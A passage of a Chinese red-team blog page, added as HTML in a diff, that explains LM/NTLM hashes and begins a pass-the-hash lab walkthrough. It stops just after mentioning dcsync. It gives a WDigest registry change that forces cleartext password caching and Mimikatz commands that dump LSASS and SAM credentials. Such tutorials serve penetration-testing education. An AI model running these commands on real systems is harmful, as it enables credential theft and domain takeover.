@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>域渗透-哈希传递攻击(Pass The Hash/Key) - F0rmat的博客-专注于网络安全、信息安全、内网渗透、红队攻防</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="F0rmat" />
+  <meta name="description" content="0x00 前言 横向渗透中的哈希传递攻击，这一部分在内网渗透中是十分关键的。在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的" />
+
+  <meta name="keywords" content="渗透测试, 网络安全, F0rmat" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.91.2" />
+
+
+<link rel="canonical" href="https://xxe.icu/post/ad_pass_key/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.5227954e5327390ee2be2e9ddae8b96f1ada64bdf87e87b56b029198ec14dcde.css" integrity="sha256-UieVTlMnOQ7ivi6d2ui5bxraZL34foe1awKRmOwU3N4=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="域渗透-哈希传递攻击(Pass The Hash/Key)" />
+<meta property="og:description" content="0x00 前言 横向渗透中的哈希传递攻击，这一部分在内网渗透中是十分关键的。在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxe.icu/post/ad_pass_key/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-02-22T00:04:34+08:00" />
+<meta property="article:modified_time" content="2022-02-22T00:04:34+08:00" />
+
+<meta itemprop="name" content="域渗透-哈希传递攻击(Pass The Hash/Key)">
+<meta itemprop="description" content="0x00 前言 横向渗透中的哈希传递攻击，这一部分在内网渗透中是十分关键的。在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的"><meta itemprop="datePublished" content="2022-02-22T00:04:34+08:00" />
+<meta itemprop="dateModified" content="2022-02-22T00:04:34+08:00" />
+<meta itemprop="wordCount" content="7919">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="域渗透-哈希传递攻击(Pass The Hash/Key)"/>
+<meta name="twitter:description" content="0x00 前言 横向渗透中的哈希传递攻击，这一部分在内网渗透中是十分关键的。在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">F0rmat's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      F0rmat's Blog
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">域渗透-哈希传递攻击(Pass The Hash/Key)</h1>
+      
+      <div class="post-meta">
+        <time datetime="2022-02-22" class="post-time">
+          2022-02-22
+        </time>
+        <div class="post-category">
+            <a href="https://xxe.icu/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"> 域渗透 </a>
+            
+          </div>
+        <span class="more-meta"> 约 7919 字 </span>
+          <span class="more-meta"> 预计阅读 16 分钟 </span>
+
+        
+        
+          <span id="busuanzi_container_page_pv">
+            | 阅读 <span id="busuanzi_value_page_pv"></span>
+          </span>
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-基础概念">0x01 基础概念</a>
+      <ul>
+        <li><a href="#什么是pth攻击">什么是PTH攻击</a></li>
+        <li><a href="#pth-的影响">PTH 的影响</a></li>
+        <li><a href="#hash的认识">Hash的认识</a>
+          <ul>
+            <li><a href="#lm-hash">LM Hash</a></li>
+            <li><a href="#ntlm-hash">NTLM Hash</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#0x02-实战">0x02 实战</a>
+      <ul>
+        <li><a href="#攻击思路">攻击思路</a></li>
+        <li><a href="#获取hash">获取Hash</a>
+          <ul>
+            <li><a href="#mimikatz">Mimikatz</a></li>
+            <li><a href="#cobalt-strike">Cobalt Strike</a></li>
+            <li><a href="#invoke-mimikatzps1">Invoke-Mimikatz.ps1</a></li>
+            <li><a href="#crackmapexec">CrackMapExec</a></li>
+            <li><a href="#转储lsass进程">转储lsass进程</a></li>
+          </ul>
+        </li>
+        <li><a href="#pass-the-hash">Pass The Hash</a>
+          <ul>
+            <li><a href="#smbmap">Smbmap</a></li>
+            <li><a href="#smbexecpy">smbexec.py</a></li>
+            <li><a href="#invoke-smbexec">Invoke-SMBExec</a></li>
+            <li><a href="#invoke-wmiexec">Invoke-WMIExec</a></li>
+            <li><a href="#wmiexec">wmiexec</a></li>
+            <li><a href="#atexec">Atexec</a></li>
+            <li><a href="#mimikatz-1">Mimikatz</a></li>
+            <li><a href="#psexec">psexec</a></li>
+            <li><a href="#crackmapexec-1">CrackMapExec</a></li>
+          </ul>
+        </li>
+        <li><a href="#pass-the-key">Pass The Key</a>
+          <ul>
+            <li><a href="#那么什么才叫做pass-the-key呢">那么什么才叫做pass the key呢？</a></li>
+            <li><a href="#使用aes-key的方式进行ptk是否要安装补丁呢">使用aes key的方式进行ptk是否要安装补丁呢？</a></li>
+          </ul>
+        </li>
+        <li><a href="#pth批量横向移动">pth批量横向移动</a>
+          <ul>
+            <li><a href="#crackmapexec-2">CrackMapExec</a></li>
+            <li><a href="#cobalt-strike-1">Cobalt Strike</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#0x03-参考">0x03 参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h1 id="0x00-前言">0x00 前言</h1>
+<p>横向渗透中的哈希传递攻击，这一部分在内网渗透中是十分关键的。在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域/工作组环境。</p>
+<p>下面我们先来了解一些基础概念，然后再进行实战攻击。</p>
+<h1 id="0x01-基础概念">0x01 基础概念</h1>
+<h2 id="什么是pth攻击">什么是PTH攻击</h2>
+<p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。因为对于每个Session hash值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</p>
+<p>虽然哈希传递攻击可以在Linux,Unix和其他平台上发生,但它们在windows系统上最普遍。 在Windows中，pth通过NT Lan Manager(NTLM)，Kereros和其他身份验证协议来进行单点登录。在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存，凭据管理器(CredMan),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p>
+<h2 id="pth-的影响">PTH 的影响</h2>
+<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre></td></tr></table>
+</div>
+</div><p>然后强制要求lsass.exe来缓存明文密码再进行抓取，但是这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。</p>
+<p>通过明文密码来横向移动是极其有效的，一个是通用弱口令，一个是密码规律的猜测，在大量机器的环境中都是很可能存在的，但是随着系统版本迭代，我们获取到明文密码的难度越来越大，但是hash的获取是固定存在的，因为window中经常需要用hash来进行验证和交互。所以利用hash来进行横向移动在内网渗透中经常充当主力的角色。</p>
+<h2 id="hash的认识">Hash的认识</h2>
+<p>既然是pass the hash，那么我就先来了解一下什么是Windows中的Hash。</p>
+<p>在前面写了几遍有关于NTLM的文章，大家可以结合起来一起学习：</p>
+<p><a href="https://xxe.icu/posts/responder_ntlmv2/">使用Responder进行NTLM重放攻击</a></p>
+<p><a href="https://xxe.icu/posts/domain-security/#1ntlm">Windows认证与域渗透</a></p>
+<h3 id="lm-hash">LM Hash</h3>
+<p>LM(LAN Mannager) 协议使用的hash就叫做 LM Hash, 由IBM设计和提出, 在过去早期使用。</p>
+<p>由于其存在比较多的缺点，比较容易破解。</p>
+<p><strong>自WindowsVista和Windows Server 2008开始,Windows取消LM hash。</strong></p>
+<p>但是在win2003中还是存在的,通过爆破LM Hash来获取明文还是比较可行的。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/1.png" alt="1"></p>
+<ol>
+<li>LM Hash生成过程</li>
+</ol>
+<ul>
+<li>用户的密码被限制为最多14个字符。</li>
+<li>用户的密码转换为大写。</li>
+<li>密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li>
+<li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）</li>
+<li>上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&ldquo;进行加密。</li>
+<li>将二组DES加密后的编码拼接，得到最终LM HASH值。</li>
+</ul>
+<p>下面是python写的加密脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding=utf-8</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">from</span> <span class="nn">pyDes</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">def</span> <span class="nf">DesEncrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">Des_Key</span><span class="p">):</span>
+    <span class="n">k</span> <span class="o">=</span> <span class="n">des</span><span class="p">(</span><span class="n">Des_Key</span><span class="p">,</span> <span class="n">ECB</span><span class="p">,</span> <span class="n">pad</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+    <span class="n">EncryptStr</span> <span class="o">=</span> <span class="n">k</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">EncryptStr</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">Zero_padding</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">num</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">b</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">n</span><span class="p">:</span><span class="n">n</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+            <span class="n">num</span> <span class="o">=</span> <span class="n">num</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+
+    <span class="n">test_str</span> <span class="o">=</span> <span class="s2">&#34;123456&#34;</span>
+    <span class="c1"># 用户的密码转换为大写,并转换为16进制字符串</span>
+    <span class="n">test_str</span> <span class="o">=</span> <span class="n">test_str</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+    <span class="n">str_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">test_str</span><span class="p">)</span>
+
+    <span class="c1"># 密码不足14字节将会用0来补全</span>
+    <span class="k">if</span> <span class="n">str_len</span> <span class="o">&lt;</span> <span class="mi">28</span><span class="p">:</span>
+        <span class="n">test_str</span> <span class="o">=</span> <span class="n">test_str</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">28</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+
+    <span class="c1"># 固定长度的密码被分成两个7byte部分</span>
+    <span class="n">t_1</span> <span class="o">=</span> <span class="n">test_str</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">test_str</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">]</span>
+    <span class="n">t_2</span> <span class="o">=</span> <span class="n">test_str</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">test_str</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">:]</span>
+
+    <span class="c1"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span>
+    <span class="n">t_1</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">t_1</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+    <span class="n">t_2</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">t_2</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+
+    <span class="c1"># 再分7bit为一组末尾加0，组成新的编码</span>
+    <span class="n">t_1</span> <span class="o">=</span> <span class="n">Zero_padding</span><span class="p">(</span><span class="n">t_1</span><span class="p">)</span>
+    <span class="n">t_2</span> <span class="o">=</span> <span class="n">Zero_padding</span><span class="p">(</span><span class="n">t_2</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="n">t_1</span>
+    <span class="n">t_1</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">t_1</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+    <span class="n">t_2</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">t_2</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+    <span class="n">t_1</span> <span class="o">=</span> <span class="n">t_1</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">)</span>
+    <span class="n">t_2</span> <span class="o">=</span> <span class="n">t_2</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s1">&#39;0&#39;</span> <span class="o">==</span> <span class="n">t_2</span><span class="p">:</span>
+        <span class="n">t_2</span> <span class="o">=</span> <span class="s2">&#34;0000000000000000&#34;</span>
+    <span class="n">t_1</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">t_1</span><span class="p">)</span>
+    <span class="n">t_2</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">t_2</span><span class="p">)</span>
+
+    <span class="c1"># 上步骤得到的8byte二组，分别作为DES key为&#34;KGS!@#$%&#34;进行加密。</span>
+    <span class="n">LM_1</span> <span class="o">=</span> <span class="n">DesEncrypt</span><span class="p">(</span><span class="s2">&#34;KGS!@#$%&#34;</span><span class="p">,</span> <span class="n">t_1</span><span class="p">)</span>
+    <span class="n">LM_2</span> <span class="o">=</span> <span class="n">DesEncrypt</span><span class="p">(</span><span class="s2">&#34;KGS!@#$%&#34;</span><span class="p">,</span> <span class="n">t_2</span><span class="p">)</span>
+
+    <span class="c1"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span>
+    <span class="n">LM</span> <span class="o">=</span> <span class="n">LM_1</span> <span class="o">+</span> <span class="n">LM_2</span>
+    <span class="nb">print</span> <span class="n">LM</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>因为在windows 7以上的版本是默认不启用LM hash的，所以要手动修改。</p>
+<p><code>gpedit.msc-计算机配置-Windows 设置-安全设置-本地策略-安全选项</code></p>
+<p>找到网络安全︰ <code>不要在下次更改密码存储 LAN 管理器的哈希值，选择已禁用</code></p>
+<p>系统下一次更改密码后，就能够导出LM hash。</p>
+<blockquote>
+<p>在我测试环境的系统发现这一项都默认启用而且不能修改</p>
+</blockquote>
+<ol start="2">
+<li>LM Hash的缺点</li>
+</ol>
+<ul>
+<li>
+<p>密码长度最大只能为14个字符</p>
+</li>
+<li>
+<p>密码不区分大小写(加密过程统一转换为大写,导致的)</p>
+</li>
+<li>
+<p>加密结果后16位为aad3b435b51404ee,则说明密码强度小于7位。(如果不够7位的话,后面需要用0来补全)</p>
+</li>
+</ul>
+<h3 id="ntlm-hash">NTLM Hash</h3>
+<p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。</p>
+<p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。如果空密码或者不储蓄LM Hash的话，我们抓到的LM Hash是AAD3B435B51404EEAAD3B435B51404EE。</p>
+<p>所以在真实环境中我们看到抓到LM Hash都是AAD3B435B51404EEAAD3B435B51404EE，这里的LM Hash并没有价值。</p>
+<p><strong>NTLM Hash 生成过程</strong></p>
+<ol>
+<li>先将用户密码转换为十六进制格式。</li>
+<li>将十六进制格式的密码进行Unicode编码。</li>
+<li>使用MD4摘要算法对Unicode编码数据进行Hash计算</li>
+</ol>
+<p>可以使用python进行生成：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import hashlib,binascii; print binascii.hexlify(hashlib.new(&#34;md4&#34;, &#34;admin&#34;.encode(&#34;utf-16le&#34;)).digest())&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>NTLM hash本地的认证</strong></p>
+<p>当用户注销、重启、锁屏之后，windows会让<strong>winlogon</strong>显示登陆界面，接收用户的输入之后，会将将密码交付给<strong>lsass</strong>进程，这个进程会将明文密码加密成NTLM hash，再与<strong>SAM数据库</strong>里对应的用户密码做对比。</p>
+<ul>
+<li>winlogon(Windows logon process)windows注册进程：是windows NT 用户的登陆程序，用于管理用户的登陆与退出</li>
+<li>lsass( Local Security Authority Service): 用于本地安全与登陆策略</li>
+<li>SAM(Security Account Manager 安全账户管理)：windows采用的账户管理策略，这个策略会将本地组的用户的账户和hash加密之后保存到SAM数据库中，SAM数据库文件路径是<code>%systemroot%\system32\config\SAM</code>文件</li>
+</ul>
+<blockquote>
+<p>本机的用户密码hash是放在本地的SAM文件里面，域内用户的密码hash存在域控的NTDS.DIT文件的。</p>
+</blockquote>
+<p>关于NTLM的认证协议这里就不再具体展开了，可以查阅<a href="https://www.anquanke.com/post/id/193149">Windows内网协议学习NTLM篇之NTLM基础介绍</a></p>
+<p>这里只要我们知道LM Hash已经不在新的系统中使用了，我们pth主要的攻击是针对NTLM Hash。</p>
+<h1 id="0x02-实战">0x02 实战</h1>
+<h2 id="攻击思路">攻击思路</h2>
+<p>首先我们假设拿到了一台内网机器，这台内网机器可能是域用户可能也是本地用户，首先要通过提权到system权限才可以导出hash值，然后利用本地保存的hash去登录内网的其他机器，还可以执行批量的操作。</p>
+<p>在域环境中，利用pass the hash的渗透方式往往是这样的：</p>
+<ol>
+<li>获得一台域主机的权限</li>
+<li>Dump内存获得用户hash</li>
+<li>通过pass the hash尝试登录其他主机</li>
+<li>继续搜集hash并尝试远程登录</li>
+<li>直到获得域管理员账户hash，登录域控，最终成功控制整个域</li>
+</ol>
+<p>比如我们现在的环境是：</p>
+<p>DC：172.16.0.106(域管用户testuser)</p>
+<p>Win7：172.16.0.105(本地管理员sc92n)</p>
+<p>域：hack.lab</p>
+<p>我们需要从win 7登录到DC，现在我们先去利用工具获取到hash的值。</p>
+<h2 id="获取hash">获取Hash</h2>
+<p>我们进行pth的过程需要获取到相关的hash才可以进行。</p>
+<h3 id="mimikatz">Mimikatz</h3>
+<p>可以到GitHub下载新版的：https://github.com/gentilkiwi/mimikatz</p>
+<p>读取lsass进程的信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">privilege::debug
+sekurlsa::msv
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/3.png" alt="3"></p>
+<p>当然也可以用下面的命令获取全部用户的密钥和明文：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">privilege::debug
+sekurlsa::logonPasswords
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/2.png" alt="2"></p>
+<p>读取SAM数据库获取用户Hash,获取系统所有本地用户的hash：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">privilege::debug
+token::elevate
+lsadump::sam
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/4.png" alt="4"></p>
+<p>也可以使用<code>dcsync</code>功能导出域内的所有hash：</p>
